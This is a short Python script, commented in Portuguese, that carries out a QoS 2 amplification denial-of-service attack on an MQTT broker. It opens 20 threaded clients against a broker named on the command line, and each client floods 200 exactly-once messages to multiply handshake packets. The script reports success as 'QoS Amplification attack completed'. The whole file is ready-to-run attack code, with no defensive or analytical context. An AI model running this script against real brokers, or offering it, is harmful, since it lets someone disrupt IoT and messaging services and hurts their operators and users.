#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import threading

def qos_amplification_attack(broker, client_id):
    client = mqtt.Client(client_id=f"amplifier_{client_id}")
    client.connect(broker, 1883, 60)
    
    # QoS 2 garante entrega exatamente uma vez - 4 handshakes!
    # PUBLISH -> PUBREC -> PUBREL -> PUBCOMP
    for i in range(200):
        client.publish("amp/target", f"QoS2_Amplified_{client_id}_{i}", qos=2)
    
    client.disconnect()
    print(f"[✓] Client {client_id} completed QoS amplification")

if __name__ == "__main__":
    import sys
    broker = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    
    threads = []
    for i in range(20):  # 20 clientes x 200 mensagens QoS 2 = 16.000 pacotes MQTT
        t = threading.Thread(target=qos_amplification_attack, args=(broker, i))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    print("[✓] QoS Amplification attack completed")